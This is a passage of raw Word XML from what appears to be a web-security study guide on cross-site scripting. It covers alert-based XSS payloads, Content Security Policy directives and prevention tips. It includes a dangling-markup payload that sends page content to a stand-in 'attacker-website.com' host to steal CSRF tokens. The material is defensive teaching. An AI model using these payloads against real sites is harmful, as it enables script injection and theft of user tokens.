      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">=1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>;alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>--&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>String template literal injection:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>...</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> input = `controllable data here`;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>...</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;!-- Include the injection as a template literal:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>${alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>--&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Content Security Policy (CSP) to prevent </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Can prevent XSS through the use of a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Content-Security-Policy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> header that prevents execution of JavaScript and resource loading.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Only</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> allow script execution from same origin as the page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>script-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> 'self'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"># Script execution from given domain to allow </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3rd party scripts</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>script-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> https://scripts.normal-website.com</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nounce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or hash of the script contents can also be specified by the CSP to only load </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> elements that have a matching </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nounce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or that the script contents match the given hash.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>The same p</w:t>
      </w:r>
      <w:r>
        <w:t>olicies exist for image tags:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Only</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> allow image load from same origin as the page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>img-src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> 'self'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Image load from given domain</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>img-src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> https://scripts.normal-website.com</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>CSPs can block clickjacking as well with their frame policies:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Only</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> allow frames </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>from same origin as the page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>frame-ancestors 'self'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Do not allow frames</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>frame-ancestors 'none'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Frames for given origin and trusted sites</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>frame-ancestors 'self' https://normal-website.com https://*.robust-website.com</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>:warning</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>: Caution must be taken if</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> user controllable input is used to generate the CSP policy (e.g. the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>report-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>uri</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).  If possible, it allows for policy overwrite.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Dangling markup XSS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Terminating markup to inject malicious scripts:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;input type="text" name="input" value="CONTROLLABLE DATA </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>HERE"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>If the controllable data is not escaped, the input can be terminated and all subsequent content forwarded as a GET request to an attacker website.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>"&gt;&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>img</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src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>='//attacker-website.com?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>This technique is used to steal CSRF tokens and other sensitive da</w:t>
      </w:r>
      <w:r>
        <w:t>ta.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Filter all input as strictly as possible.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Encode data when output to prevent it being interpreted as HTML.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>reponse</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> headers to prevent XSS with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Content-Type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>X-Content-Type-Options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if the response is not HTML.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use a Content Security Polic</w:t>
      </w:r>
      <w:r>
        <w:t>y (CSP) to prevent the execution of malicious scripts.</w:t>
      </w:r>
    </w:p>
